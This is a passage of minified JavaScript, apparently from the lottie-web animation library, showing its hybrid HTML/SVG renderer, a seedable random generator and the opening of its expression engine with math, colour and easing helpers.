          (this.camera = null),
          (this.supports3d = !0),
          (this.rendererType = "html");
      }
      extendPrototype([BaseRenderer], HybridRendererBase),
        (HybridRendererBase.prototype.buildItem =
          SVGRenderer.prototype.buildItem),
        (HybridRendererBase.prototype.checkPendingElements = function () {
          for (; this.pendingElements.length; ) {
            var i = this.pendingElements.pop();
            i.checkParenting();
          }
        }),
        (HybridRendererBase.prototype.appendElementInPos = function (i, a) {
          var o = i.getBaseElement();
          if (o) {
            var s = this.layers[a];
            if (!s.ddd || !this.supports3d)
              if (this.threeDElements) this.addTo3dContainer(o, a);
              else {
                for (var tt = 0, nt, ot, st; tt < a; )
                  this.elements[tt] &&
                    this.elements[tt] !== !0 &&
                    this.elements[tt].getBaseElement &&
                    ((ot = this.elements[tt]),
                    (st = this.layers[tt].ddd
                      ? this.getThreeDContainerByPos(tt)
                      : ot.getBaseElement()),
                    (nt = st || nt)),
                    (tt += 1);
                nt
                  ? (!s.ddd || !this.supports3d) &&
                    this.layerElement.insertBefore(o, nt)
                  : (!s.ddd || !this.supports3d) &&
                    this.layerElement.appendChild(o);
              }
            else this.addTo3dContainer(o, a);
          }
        }),
        (HybridRendererBase.prototype.createShape = function (i) {
          return this.supports3d
            ? new HShapeElement(i, this.globalData, this)
            : new SVGShapeElement(i, this.globalData, this);
        }),
        (HybridRendererBase.prototype.createText = function (i) {
          return this.supports3d
            ? new HTextElement(i, this.globalData, this)
            : new SVGTextLottieElement(i, this.globalData, this);
        }),
        (HybridRendererBase.prototype.createCamera = function (i) {
          return (
            (this.camera = new HCameraElement(i, this.globalData, this)),
            this.camera
          );
        }),
        (HybridRendererBase.prototype.createImage = function (i) {
          return this.supports3d
            ? new HImageElement(i, this.globalData, this)
            : new IImageElement(i, this.globalData, this);
        }),
        (HybridRendererBase.prototype.createSolid = function (i) {
          return this.supports3d
            ? new HSolidElement(i, this.globalData, this)
            : new ISolidElement(i, this.globalData, this);
        }),
        (HybridRendererBase.prototype.createNull =
          SVGRenderer.prototype.createNull),
        (HybridRendererBase.prototype.getThreeDContainerByPos = function (i) {
          for (var a = 0, o = this.threeDElements.length; a < o; ) {
            if (
              this.threeDElements[a].startPos <= i &&
              this.threeDElements[a].endPos >= i
            )
              return this.threeDElements[a].perspectiveElem;
            a += 1;
          }
          return null;
        }),
        (HybridRendererBase.prototype.createThreeDContainer = function (i, a) {
          var o = createTag("div"),
            s,
            tt;
          styleDiv(o);
          var nt = createTag("div");
          if ((styleDiv(nt), a === "3d")) {
            (s = o.style),
              (s.width = this.globalData.compSize.w + "px"),
              (s.height = this.globalData.compSize.h + "px");
            var ot = "50% 50%";
            (s.webkitTransformOrigin = ot),
              (s.mozTransformOrigin = ot),
              (s.transformOrigin = ot),
              (tt = nt.style);
            var st = "matrix3d(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1)";
            (tt.transform = st), (tt.webkitTransform = st);
          }
          o.appendChild(nt);
          var ft = {
            container: nt,
            perspectiveElem: o,
            startPos: i,
            endPos: i,
            type: a,
          };
          return this.threeDElements.push(ft), ft;
        }),
        (HybridRendererBase.prototype.build3dContainers = function () {
          var i,
            a = this.layers.length,
            o,
            s = "";
          for (i = 0; i < a; i += 1)
            this.layers[i].ddd && this.layers[i].ty !== 3
              ? (s !== "3d" &&
                  ((s = "3d"), (o = this.createThreeDContainer(i, "3d"))),
                (o.endPos = Math.max(o.endPos, i)))
              : (s !== "2d" &&
                  ((s = "2d"), (o = this.createThreeDContainer(i, "2d"))),
                (o.endPos = Math.max(o.endPos, i)));
          for (a = this.threeDElements.length, i = a - 1; i >= 0; i -= 1)
            this.resizerElem.appendChild(
              this.threeDElements[i].perspectiveElem
            );
        }),
        (HybridRendererBase.prototype.addTo3dContainer = function (i, a) {
          for (var o = 0, s = this.threeDElements.length; o < s; ) {
            if (a <= this.threeDElements[o].endPos) {
              for (var tt = this.threeDElements[o].startPos, nt; tt < a; )
                this.elements[tt] &&
                  this.elements[tt].getBaseElement &&
                  (nt = this.elements[tt].getBaseElement()),
                  (tt += 1);
              nt
                ? this.threeDElements[o].container.insertBefore(i, nt)
                : this.threeDElements[o].container.appendChild(i);
              break;
            }
            o += 1;
          }
        }),
        (HybridRendererBase.prototype.configAnimation = function (i) {
          var a = createTag("div"),
            o = this.animationItem.wrapper,
            s = a.style;
          (s.width = i.w + "px"),
            (s.height = i.h + "px"),
            (this.resizerElem = a),
            styleDiv(a),
            (s.transformStyle = "flat"),
            (s.mozTransformStyle = "flat"),
            (s.webkitTransformStyle = "flat"),
            this.renderConfig.className &&
              a.setAttribute("class", this.renderConfig.className),
            o.appendChild(a),
            (s.overflow = "hidden");
          var tt = createNS("svg");
          tt.setAttribute("width", "1"),
            tt.setAttribute("height", "1"),
            styleDiv(tt),
            this.resizerElem.appendChild(tt);
          var nt = createNS("defs");
          tt.appendChild(nt),
            (this.data = i),
            this.setupGlobalData(i, tt),
            (this.globalData.defs = nt),
            (this.layers = i.layers),
            (this.layerElement = this.resizerElem),
            this.build3dContainers(),
            this.updateContainerSize();
        }),
        (HybridRendererBase.prototype.destroy = function () {
          this.animationItem.wrapper &&
            (this.animationItem.wrapper.innerText = ""),
            (this.animationItem.container = null),
            (this.globalData.defs = null);
          var i,
            a = this.layers ? this.layers.length : 0;
          for (i = 0; i < a; i += 1)
            this.elements[i] &&
              this.elements[i].destroy &&
              this.elements[i].destroy();
          (this.elements.length = 0),
            (this.destroyed = !0),
            (this.animationItem = null);
        }),
        (HybridRendererBase.prototype.updateContainerSize = function () {
          var i = this.animationItem.wrapper.offsetWidth,
            a = this.animationItem.wrapper.offsetHeight,
            o = i / a,
            s = this.globalData.compSize.w / this.globalData.compSize.h,
            tt,
            nt,
            ot,
            st;
          s > o
            ? ((tt = i / this.globalData.compSize.w),
              (nt = i / this.globalData.compSize.w),
              (ot = 0),
              (st =
                (a -
                  this.globalData.compSize.h *
                    (i / this.globalData.compSize.w)) /
                2))
            : ((tt = a / this.globalData.compSize.h),
              (nt = a / this.globalData.compSize.h),
              (ot =
                (i -
                  this.globalData.compSize.w *
                    (a / this.globalData.compSize.h)) /
                2),
              (st = 0));
          var ft = this.resizerElem.style;
          (ft.webkitTransform =
            "matrix3d(" +
            tt +
            ",0,0,0,0," +
            nt +
            ",0,0,0,0,1,0," +
            ot +
            "," +
            st +
            ",0,1)"),
            (ft.transform = ft.webkitTransform);
        }),
        (HybridRendererBase.prototype.renderFrame =
          SVGRenderer.prototype.renderFrame),
        (HybridRendererBase.prototype.hide = function () {
          this.resizerElem.style.display = "none";
        }),
        (HybridRendererBase.prototype.show = function () {
          this.resizerElem.style.display = "block";
        }),
        (HybridRendererBase.prototype.initItems = function () {
          if ((this.buildAllItems(), this.camera)) this.camera.setup();
          else {
            var i = this.globalData.compSize.w,
              a = this.globalData.compSize.h,
              o,
              s = this.threeDElements.length;
            for (o = 0; o < s; o += 1) {
              var tt = this.threeDElements[o].perspectiveElem.style;
              (tt.webkitPerspective =
                Math.sqrt(Math.pow(i, 2) + Math.pow(a, 2)) + "px"),
                (tt.perspective = tt.webkitPerspective);
            }
          }
        }),
        (HybridRendererBase.prototype.searchExtraCompositions = function (i) {
          var a,
            o = i.length,
            s = createTag("div");
          for (a = 0; a < o; a += 1)
            if (i[a].xt) {
              var tt = this.createComp(i[a], s, this.globalData.comp, null);
              tt.initExpressions(),
                this.globalData.projectInterface.registerComposition(tt);
            }
        });
      function HCompElement(i, a, o) {
        (this.layers = i.layers),
          (this.supports3d = !i.hasMask),
          (this.completeLayers = !1),
          (this.pendingElements = []),
          (this.elements = this.layers
            ? createSizedArray(this.layers.length)
            : []),
          this.initElement(i, a, o),
          (this.tm = i.tm
            ? PropertyFactory.getProp(this, i.tm, 0, a.frameRate, this)
            : { _placeholder: !0 });
      }
      extendPrototype(
        [HybridRendererBase, ICompElement, HBaseElement],
        HCompElement
      ),
        (HCompElement.prototype._createBaseContainerElements =
          HCompElement.prototype.createContainerElements),
        (HCompElement.prototype.createContainerElements = function () {
          this._createBaseContainerElements(),
            this.data.hasMask
              ? (this.svgElement.setAttribute("width", this.data.w),
                this.svgElement.setAttribute("height", this.data.h),
                (this.transformedElement = this.baseElement))
              : (this.transformedElement = this.layerElement);
        }),
        (HCompElement.prototype.addTo3dContainer = function (i, a) {
          for (var o = 0, s; o < a; )
            this.elements[o] &&
              this.elements[o].getBaseElement &&
              (s = this.elements[o].getBaseElement()),
              (o += 1);
          s
            ? this.layerElement.insertBefore(i, s)
            : this.layerElement.appendChild(i);
        }),
        (HCompElement.prototype.createComp = function (i) {
          return this.supports3d
            ? new HCompElement(i, this.globalData, this)
            : new SVGCompElement(i, this.globalData, this);
        });
      function HybridRenderer(i, a) {
        (this.animationItem = i),
          (this.layers = null),
          (this.renderedFrame = -1),
          (this.renderConfig = {
            className: (a && a.className) || "",
            imagePreserveAspectRatio:
              (a && a.imagePreserveAspectRatio) || "xMidYMid slice",
            hideOnTransparent: !(a && a.hideOnTransparent === !1),
            filterSize: {
              width: (a && a.filterSize && a.filterSize.width) || "400%",
              height: (a && a.filterSize && a.filterSize.height) || "400%",
              x: (a && a.filterSize && a.filterSize.x) || "-100%",
              y: (a && a.filterSize && a.filterSize.y) || "-100%",
            },
            runExpressions:
              !a || a.runExpressions === void 0 || a.runExpressions,
          }),
          (this.globalData = {
            _mdf: !1,
            frameNum: -1,
            renderConfig: this.renderConfig,
          }),
          (this.pendingElements = []),
          (this.elements = []),
          (this.threeDElements = []),
          (this.destroyed = !1),
          (this.camera = null),
          (this.supports3d = !0),
          (this.rendererType = "html");
      }
      extendPrototype([HybridRendererBase], HybridRenderer),
        (HybridRenderer.prototype.createComp = function (i) {
          return this.supports3d
            ? new HCompElement(i, this.globalData, this)
            : new SVGCompElement(i, this.globalData, this);
        });
      var CompExpressionInterface = (function () {
        return function (i) {
          function a(o) {
            for (var s = 0, tt = i.layers.length; s < tt; ) {
              if (i.layers[s].nm === o || i.layers[s].ind === o)
                return i.elements[s].layerInterface;
              s += 1;
            }
            return null;
          }
          return (
            Object.defineProperty(a, "_name", { value: i.data.nm }),
            (a.layer = a),
            (a.pixelAspect = 1),
            (a.height = i.data.h || i.globalData.compSize.h),
            (a.width = i.data.w || i.globalData.compSize.w),
            (a.pixelAspect = 1),
            (a.frameDuration = 1 / i.globalData.frameRate),
            (a.displayStartTime = 0),
            (a.numLayers = i.layers.length),
            a
          );
        };
      })();
      function _typeof$2(i) {
        "@babel/helpers - typeof";
        return (
          typeof Symbol == "function" && typeof Symbol.iterator == "symbol"
            ? (_typeof$2 = function (o) {
                return typeof o;
              })
            : (_typeof$2 = function (o) {
                return o &&
                  typeof Symbol == "function" &&
                  o.constructor === Symbol &&
                  o !== Symbol.prototype
                  ? "symbol"
                  : typeof o;
              }),
          _typeof$2(i)
        );
      }
      function seedRandom(i, a) {
        var o = this,
          s = 256,
          tt = 6,
          nt = 52,
          ot = "random",
          st = a.pow(s, tt),
          ft = a.pow(2, nt),
          ht = ft * 2,
          gt = s - 1,
          St;
        function vt(yt, wt, $t) {
          var kt = [];
          wt = wt === !0 ? { entropy: !0 } : wt || {};
          var Rt = Pt(
              Ct(wt.entropy ? [yt, xt(i)] : yt === null ? bt() : yt, 3),
              kt
            ),
            It = new _t(kt),
            Ot = function () {
              for (var zt = It.g(tt), Bt = st, Wt = 0; zt < ft; )
                (zt = (zt + Wt) * s), (Bt *= s), (Wt = It.g(1));
              for (; zt >= ht; ) (zt /= 2), (Bt /= 2), (Wt >>>= 1);
              return (zt + Wt) / Bt;
            };
          return (
            (Ot.int32 = function () {
              return It.g(4) | 0;
            }),
            (Ot.quick = function () {
              return It.g(4) / 4294967296;
            }),
            (Ot.double = Ot),
            Pt(xt(It.S), i),
            (
              wt.pass ||
              $t ||
              function (Nt, zt, Bt, Wt) {
                return (
                  Wt &&
                    (Wt.S && Et(Wt, It),
                    (Nt.state = function () {
                      return Et(It, {});
                    })),
                  Bt ? ((a[ot] = Nt), zt) : Nt
                );
              }
            )(Ot, Rt, "global" in wt ? wt.global : this == a, wt.state)
          );
        }
        a["seed" + ot] = vt;
        function _t(yt) {
          var wt,
            $t = yt.length,
            kt = this,
            Rt = 0,
            It = (kt.i = kt.j = 0),
            Ot = (kt.S = []);
          for ($t || (yt = [$t++]); Rt < s; ) Ot[Rt] = Rt++;
          for (Rt = 0; Rt < s; Rt++)
            (Ot[Rt] = Ot[(It = gt & (It + yt[Rt % $t] + (wt = Ot[Rt])))]),
              (Ot[It] = wt);
          kt.g = function (Nt) {
            for (var zt, Bt = 0, Wt = kt.i, Gt = kt.j, Vt = kt.S; Nt--; )
              (zt = Vt[(Wt = gt & (Wt + 1))]),
                (Bt =
                  Bt * s +
                  Vt[
                    gt & ((Vt[Wt] = Vt[(Gt = gt & (Gt + zt))]) + (Vt[Gt] = zt))
                  ]);
            return (kt.i = Wt), (kt.j = Gt), Bt;
          };
        }
        function Et(yt, wt) {
          return (wt.i = yt.i), (wt.j = yt.j), (wt.S = yt.S.slice()), wt;
        }
        function Ct(yt, wt) {
          var $t = [],
            kt = _typeof$2(yt),
            Rt;
          if (wt && kt == "object")
            for (Rt in yt)
              try {
                $t.push(Ct(yt[Rt], wt - 1));
              } catch {}
          return $t.length ? $t : kt == "string" ? yt : yt + "\0";
        }
        function Pt(yt, wt) {
          for (var $t = yt + "", kt, Rt = 0; Rt < $t.length; )
            wt[gt & Rt] = gt & ((kt ^= wt[gt & Rt] * 19) + $t.charCodeAt(Rt++));
          return xt(wt);
        }
        function bt() {
          try {
            var yt = new Uint8Array(s);
            return (o.crypto || o.msCrypto).getRandomValues(yt), xt(yt);
          } catch {
            var wt = o.navigator,
              $t = wt && wt.plugins;
            return [+new Date(), o, $t, o.screen, xt(i)];
          }
        }
        function xt(yt) {
          return String.fromCharCode.apply(0, yt);
        }
        Pt(a.random(), i);
      }
      function initialize$2(i) {
        seedRandom([], i);
      }
      var propTypes = { SHAPE: "shape" };
      function _typeof$1(i) {
        "@babel/helpers - typeof";
        return (
          typeof Symbol == "function" && typeof Symbol.iterator == "symbol"
            ? (_typeof$1 = function (o) {
                return typeof o;
              })
            : (_typeof$1 = function (o) {
                return o &&
                  typeof Symbol == "function" &&
                  o.constructor === Symbol &&
                  o !== Symbol.prototype
                  ? "symbol"
                  : typeof o;
              }),
          _typeof$1(i)
        );
      }
      var ExpressionManager = (function () {
          var ob = {},
            Math = BMMath,
            window = null,
            document = null,
            XMLHttpRequest = null,
            fetch = null,
            frames = null,
            _lottieGlobal = {};
          initialize$2(BMMath);
          function resetFrame() {
            _lottieGlobal = {};
          }
          function $bm_isInstanceOfArray(i) {
            return i.constructor === Array || i.constructor === Float32Array;
          }
          function isNumerable(i, a) {
            return (
              i === "number" ||
              a instanceof Number ||
              i === "boolean" ||
              i === "string"
            );
          }
          function $bm_neg(i) {
            var a = _typeof$1(i);
            if (a === "number" || i instanceof Number || a === "boolean")
              return -i;
            if ($bm_isInstanceOfArray(i)) {
              var o,
                s = i.length,
                tt = [];
              for (o = 0; o < s; o += 1) tt[o] = -i[o];
              return tt;
            }
            return i.propType ? i.v : -i;
          }
          var easeInBez = BezierFactory.getBezierEasing(
              0.333,
              0,
              0.833,
              0.833,
              "easeIn"
            ).get,
            easeOutBez = BezierFactory.getBezierEasing(
              0.167,
              0.167,
              0.667,
              1,
              "easeOut"
            ).get,
            easeInOutBez = BezierFactory.getBezierEasing(
              0.33,
              0,
              0.667,
              1,
              "easeInOut"
            ).get;
          function sum(i, a) {
            var o = _typeof$1(i),
              s = _typeof$1(a);
            if (
              (isNumerable(o, i) && isNumerable(s, a)) ||
              o === "string" ||
              s === "string"
            )
              return i + a;
            if ($bm_isInstanceOfArray(i) && isNumerable(s, a))
              return (i = i.slice(0)), (i[0] += a), i;
            if (isNumerable(o, i) && $bm_isInstanceOfArray(a))
              return (a = a.slice(0)), (a[0] = i + a[0]), a;
            if ($bm_isInstanceOfArray(i) && $bm_isInstanceOfArray(a)) {
              for (
                var tt = 0, nt = i.length, ot = a.length, st = [];
                tt < nt || tt < ot;

              )
                (typeof i[tt] == "number" || i[tt] instanceof Number) &&
                (typeof a[tt] == "number" || a[tt] instanceof Number)
                  ? (st[tt] = i[tt] + a[tt])
                  : (st[tt] = a[tt] === void 0 ? i[tt] : i[tt] || a[tt]),
                  (tt += 1);
              return st;
            }
            return 0;
          }
          var add = sum;
          function sub(i, a) {
            var o = _typeof$1(i),
              s = _typeof$1(a);
            if (isNumerable(o, i) && isNumerable(s, a))
              return (
                o === "string" && (i = parseInt(i, 10)),
                s === "string" && (a = parseInt(a, 10)),
                i - a
              );
            if ($bm_isInstanceOfArray(i) && isNumerable(s, a))
              return (i = i.slice(0)), (i[0] -= a), i;
            if (isNumerable(o, i) && $bm_isInstanceOfArray(a))
              return (a = a.slice(0)), (a[0] = i - a[0]), a;
            if ($bm_isInstanceOfArray(i) && $bm_isInstanceOfArray(a)) {
              for (
                var tt = 0, nt = i.length, ot = a.length, st = [];
                tt < nt || tt < ot;

              )
                (typeof i[tt] == "number" || i[tt] instanceof Number) &&
                (typeof a[tt] == "number" || a[tt] instanceof Number)
                  ? (st[tt] = i[tt] - a[tt])
                  : (st[tt] = a[tt] === void 0 ? i[tt] : i[tt] || a[tt]),
                  (tt += 1);
              return st;
            }
            return 0;
          }
          function mul(i, a) {
            var o = _typeof$1(i),
              s = _typeof$1(a),
              tt;
            if (isNumerable(o, i) && isNumerable(s, a)) return i * a;
            var nt, ot;
            if ($bm_isInstanceOfArray(i) && isNumerable(s, a)) {
              for (
                ot = i.length, tt = createTypedArray("float32", ot), nt = 0;
                nt < ot;
                nt += 1
              )
                tt[nt] = i[nt] * a;
              return tt;
            }
            if (isNumerable(o, i) && $bm_isInstanceOfArray(a)) {
              for (
                ot = a.length, tt = createTypedArray("float32", ot), nt = 0;
                nt < ot;
                nt += 1
              )
                tt[nt] = i * a[nt];
              return tt;
            }
            return 0;
          }
          function div(i, a) {
            var o = _typeof$1(i),
              s = _typeof$1(a),
              tt;
            if (isNumerable(o, i) && isNumerable(s, a)) return i / a;
            var nt, ot;
            if ($bm_isInstanceOfArray(i) && isNumerable(s, a)) {
              for (
                ot = i.length, tt = createTypedArray("float32", ot), nt = 0;
                nt < ot;
                nt += 1
              )
                tt[nt] = i[nt] / a;
              return tt;
            }
            if (isNumerable(o, i) && $bm_isInstanceOfArray(a)) {
              for (
                ot = a.length, tt = createTypedArray("float32", ot), nt = 0;
                nt < ot;
                nt += 1
              )
                tt[nt] = i / a[nt];
              return tt;
            }
            return 0;
          }
          function mod(i, a) {
            return (
              typeof i == "string" && (i = parseInt(i, 10)),
              typeof a == "string" && (a = parseInt(a, 10)),
              i % a
            );
          }
          var $bm_sum = sum,
            $bm_sub = sub,
            $bm_mul = mul,
            $bm_div = div,
            $bm_mod = mod;
          function clamp(i, a, o) {
            if (a > o) {
              var s = o;
              (o = a), (a = s);
            }
            return Math.min(Math.max(i, a), o);
          }
          function radiansToDegrees(i) {
            return i / degToRads;
          }
          var radians_to_degrees = radiansToDegrees;
          function degreesToRadians(i) {
            return i * degToRads;
          }
          var degrees_to_radians = radiansToDegrees,
            helperLengthArray = [0, 0, 0, 0, 0, 0];
          function length(i, a) {
            if (typeof i == "number" || i instanceof Number)
              return (a = a || 0), Math.abs(i - a);
            a || (a = helperLengthArray);
            var o,
              s = Math.min(i.length, a.length),
              tt = 0;
            for (o = 0; o < s; o += 1) tt += Math.pow(a[o] - i[o], 2);
            return Math.sqrt(tt);
          }
          function normalize(i) {
            return div(i, length(i));
          }
          function rgbToHsl(i) {
            var a = i[0],
              o = i[1],
              s = i[2],
              tt = Math.max(a, o, s),
              nt = Math.min(a, o, s),
              ot,
              st,
              ft = (tt + nt) / 2;
            if (tt === nt) (ot = 0), (st = 0);
            else {
              var ht = tt - nt;
              switch (
                ((st = ft > 0.5 ? ht / (2 - tt - nt) : ht / (tt + nt)), tt)
              ) {
                case a:
                  ot = (o - s) / ht + (o < s ? 6 : 0);
                  break;
                case o:
                  ot = (s - a) / ht + 2;
                  break;
                case s:
                  ot = (a - o) / ht + 4;
                  break;
              }
              ot /= 6;
            }
            return [ot, st, ft, i[3]];
          }
          function hue2rgb(i, a, o) {
            return (
              o < 0 && (o += 1),
              o > 1 && (o -= 1),
              o < 1 / 6
                ? i + (a - i) * 6 * o
                : o < 1 / 2
                ? a
                : o < 2 / 3
                ? i + (a - i) * (2 / 3 - o) * 6
                : i
            );
          }
          function hslToRgb(i) {
            var a = i[0],
              o = i[1],
              s = i[2],
              tt,
              nt,
              ot;
            if (o === 0) (tt = s), (ot = s), (nt = s);
            else {
              var st = s < 0.5 ? s * (1 + o) : s + o - s * o,
                ft = 2 * s - st;
              (tt = hue2rgb(ft, st, a + 1 / 3)),
                (nt = hue2rgb(ft, st, a)),
                (ot = hue2rgb(ft, st, a - 1 / 3));
            }
            return [tt, nt, ot, i[3]];
          }
          function linear(i, a, o, s, tt) {
            if (
              ((s === void 0 || tt === void 0) &&
                ((s = a), (tt = o), (a = 0), (o = 1)),
              o < a)
            ) {
              var nt = o;
              (o = a), (a = nt);
            }
            if (i <= a) return s;
            if (i >= o) return tt;
            var ot = o === a ? 0 : (i - a) / (o - a);
            if (!s.length) return s + (tt - s) * ot;
            var st,
              ft = s.length,
              ht = createTypedArray("float32", ft);
            for (st = 0; st < ft; st += 1)
              ht[st] = s[st] + (tt[st] - s[st]) * ot;
            return ht;
          }
          function random(i, a) {
            if (
              (a === void 0 &&
                (i === void 0 ? ((i = 0), (a = 1)) : ((a = i), (i = void 0))),
              a.length)
            ) {
              var o,
                s = a.length;
              i || (i = createTypedArray("float32", s));
              var tt = createTypedArray("float32", s),
                nt = BMMath.random();
              for (o = 0; o < s; o += 1) tt[o] = i[o] + nt * (a[o] - i[o]);
              return tt;
            }
            i === void 0 && (i = 0);
            var ot = BMMath.random();
            return i + ot * (a - i);
          }
          function createPath(i, a, o, s) {
            var tt,
              nt = i.length,
              ot = shapePool.newElement();
            ot.setPathData(!!s, nt);
            var st = [0, 0],
              ft,
              ht;
            for (tt = 0; tt < nt; tt += 1)
              (ft = a && a[tt] ? a[tt] : st),
                (ht = o && o[tt] ? o[tt] : st),
                ot.setTripleAt(
                  i[tt][0],
                  i[tt][1],
                  ht[0] + i[tt][0],
                  ht[1] + i[tt][1],
                  ft[0] + i[tt][0],
                  ft[1] + i[tt][1],
                  tt,
                  !0
                );
            return ot;
          }
          function initiateExpression(elem, data, property) {
            function noOp(i) {
              return i;
            }
            if (!elem.globalData.renderConfig.runExpressions) return noOp;
            var val = data.x,
              needsVelocity = /velocity(?![\w\d])/.test(val),
              _needsRandom = val.indexOf("random") !== -1,
              elemType = elem.data.ty,
              transform,
              $bm_transform,
              content,
              effect,
              thisProperty = property;
            (thisProperty.valueAtTime = thisProperty.getValueAtTime),
              Object.defineProperty(thisProperty, "value", {
                get: function () {
                  return thisProperty.v;
                },
              }),
              (elem.comp.frameDuration = 1 / elem.comp.globalData.frameRate),
              (elem.comp.displayStartTime = 0);
            var inPoint = elem.data.ip / elem.comp.globalData.frameRate,
              outPoint = elem.data.op / elem.comp.globalData.frameRate,
              width = elem.data.sw ? elem.data.sw : 0,
              height = elem.data.sh ? elem.data.sh : 0,
              name = elem.data.nm,
              loopIn,
              loop_in,
              loopOut,
              loop_out,
              smooth,
              toWorld,
              fromWorld,
              fromComp,
              toComp,
              fromCompToSurface,
              position,
              rotation,
              anchorPoint,
              scale,
              thisLayer,
              thisComp,
              mask,
              valueAtTime,
              velocityAtTime,
              scoped_bm_rt,
              expression_function = eval(
                "[function _expression_function(){" +
                  val +
                  ";scoped_bm_rt=$bm_rt}]"
              )[0],
              numKeys = property.kf ? data.k.length : 0,
              active = !this.data || this.data.hd !== !0,
              wiggle = function i(a, o) {
                var s,
                  tt,
                  nt = this.pv.length ? this.pv.length : 1,
                  ot = createTypedArray("float32", nt);
                a = 5;
                var st = Math.floor(time * a);
                for (s = 0, tt = 0; s < st; ) {
                  for (tt = 0; tt < nt; tt += 1)
                    ot[tt] += -o + o * 2 * BMMath.random();
                  s += 1;
                }
                var ft = time * a,
                  ht = ft - Math.floor(ft),
                  gt = createTypedArray("float32", nt);
                if (nt > 1) {
                  for (tt = 0; tt < nt; tt += 1)
                    gt[tt] =
                      this.pv[tt] +
                      ot[tt] +
                      (-o + o * 2 * BMMath.random()) * ht;
                  return gt;
                }
                return this.pv + ot[0] + (-o + o * 2 * BMMath.random()) * ht;
              }.bind(this);
            thisProperty.loopIn &&
              ((loopIn = thisProperty.loopIn.bind(thisProperty)),
              (loop_in = loopIn)),
              thisProperty.loopOut &&
                ((loopOut = thisProperty.loopOut.bind(thisProperty)),
                (loop_out = loopOut)),
              thisProperty.smooth &&
                (smooth = thisProperty.smooth.bind(thisProperty));
            function loopInDuration(i, a) {
              return loopIn(i, a, !0);
            }
            function loopOutDuration(i, a) {
              return loopOut(i, a, !0);
            }
            this.getValueAtTime &&
              (valueAtTime = this.getValueAtTime.bind(this)),
              this.getVelocityAtTime &&
                (velocityAtTime = this.getVelocityAtTime.bind(this));
            var comp = elem.comp.globalData.projectInterface.bind(
              elem.comp.globalData.projectInterface
            );
            function lookAt(i, a) {
              var o = [a[0] - i[0], a[1] - i[1], a[2] - i[2]],
                s =
                  Math.atan2(o[0], Math.sqrt(o[1] * o[1] + o[2] * o[2])) /
                  degToRads,
                tt = -Math.atan2(o[1], o[2]) / degToRads;
              return [tt, s, 0];
            }
            function easeOut(i, a, o, s, tt) {
              return applyEase(easeOutBez, i, a, o, s, tt);
            }
            function easeIn(i, a, o, s, tt) {
              return applyEase(easeInBez, i, a, o, s, tt);
            }
            function ease(i, a, o, s, tt) {
              return applyEase(easeInOutBez, i, a, o, s, tt);
            }
            function applyEase(i, a, o, s, tt, nt) {
              tt === void 0 ? ((tt = o), (nt = s)) : (a = (a - o) / (s - o)),
                a > 1 ? (a = 1) : a < 0 && (a = 0);
              var ot = i(a);
              if ($bm_isInstanceOfArray(tt)) {
                var st,
                  ft = tt.length,
                  ht = createTypedArray("float32", ft);
                for (st = 0; st < ft; st += 1)
                  ht[st] = (nt[st] - tt[st]) * ot + tt[st];
                return ht;
              }
              return (nt - tt) * ot + tt;
            }
            function nearestKey(i) {
              var a,
                o = data.k.length,
                s,
                tt;
              if (!data.k.length || typeof data.k[0] == "number")
                (s = 0), (tt = 0);
              else if (
                ((s = -1),
                (i *= elem.comp.globalData.frameRate),
                i < data.k[0].t)
              )
                (s = 1), (tt = data.k[0].t);
              else {
                for (a = 0; a < o - 1; a += 1)
                  if (i === data.k[a].t) {
                    (s = a + 1), (tt = data.k[a].t);
                    break;
                  } else if (i > data.k[a].t && i < data.k[a + 1].t) {
                    i - data.k[a].t > data.k[a + 1].t - i
                      ? ((s = a + 2), (tt = data.k[a + 1].t))
                      : ((s = a + 1), (tt = data.k[a].t));
                    break;
                  }
                s === -1 && ((s = a + 1), (tt = data.k[a].t));
              }
              var nt = {};
              return (
                (nt.index = s),
                (nt.time = tt / elem.comp.globalData.frameRate),
                nt
              );
            }
            function key(i) {
              var a, o, s;
              if (!data.k.length || typeof data.k[0] == "number")
                throw new Error("The property has no keyframe at index " + i);
              (i -= 1),
                (a = {
                  time: data.k[i].t / elem.comp.globalData.frameRate,
                  value: [],
                });
              var tt = Object.prototype.hasOwnProperty.call(data.k[i], "s")
                ? data.k[i].s
                : data.k[i - 1].e;
              for (s = tt.length, o = 0; o < s; o += 1)
                (a[o] = tt[o]), (a.value[o] = tt[o]);
              return a;
            }
            function framesToTime(i, a) {
              return a || (a = elem.comp.globalData.frameRate), i / a;
            }
            function timeToFrames(i, a) {
              return (
                !i && i !== 0 && (i = time),
                a || (a = elem.comp.globalData.frameRate),
                i * a
              );
            }
            function seedRandom(i) {
              BMMath.seedrandom(randSeed + i);
            }
            function sourceRectAtTime() {
              return elem.sourceRectAtTime();
            }
            function substring(i, a) {
              return typeof value == "string"
                ? a === void 0
                  ? value.substring(i)
                  : value.substring(i, a)
                : "";
            }
            function substr(i, a) {
              return typeof value == "string"
                ? a === void 0
                  ? value.substr(i)
                  : value.substr(i, a)
                : "";
            }
            function posterizeTime(i) {
              (time = i === 0 ? 0 : Math.floor(time * i) / i),
                (value = valueAtTime(time));
            }
            var time,
              velocity,
              value,
              text,
              textIndex,
              textTotal,
              selectorValue,
              index = elem.data.ind,
              hasParent = !!(elem.hierarchy && elem.hierarchy.length),
              parent,
              randSeed = Math.floor(Math.random() * 1e6),
              globalData = elem.globalData;
            function executeExpression(i) {
              return (
                (value = i),
                this.frameExpressionId === elem.globalData.frameId &&
                this.propType !== "textSelector"
                  ? value
                  : (this.propType === "textSelector" &&
                      ((textIndex = this.textIndex),
                      (textTotal = this.textTotal),
                      (selectorValue = this.selectorValue)),
                    thisLayer ||
                      ((text = elem.layerInterface.text),
                      (thisLayer = elem.layerInterface),
                      (thisComp = elem.comp.compInterface),
                      (toWorld = thisLayer.toWorld.bind(thisLayer)),
                      (fromWorld = thisLayer.fromWorld.bind(thisLayer)),
                      (fromComp = thisLayer.fromComp.bind(thisLayer)),
                      (toComp = thisLayer.toComp.bind(thisLayer)),
                      (mask = thisLayer.mask
                        ? thisLayer.mask.bind(thisLayer)
                        : null),
                      (fromCompToSurface = fromComp)),
                    transform ||
                      ((transform = elem.layerInterface(
                        "ADBE Transform Group"
                      )),
                      ($bm_transform = transform),
                      transform && (anchorPoint = transform.anchorPoint)),
                    elemType === 4 &&
                      !content &&
                      (content = thisLayer("ADBE Root Vectors Group")),
                    effect || (effect = thisLayer(4)),
                    (hasParent = !!(elem.hierarchy && elem.hierarchy.length)),
                    hasParent &&
                      !parent &&
                      (parent = elem.hierarchy[0].layerInterface),
                    (time =
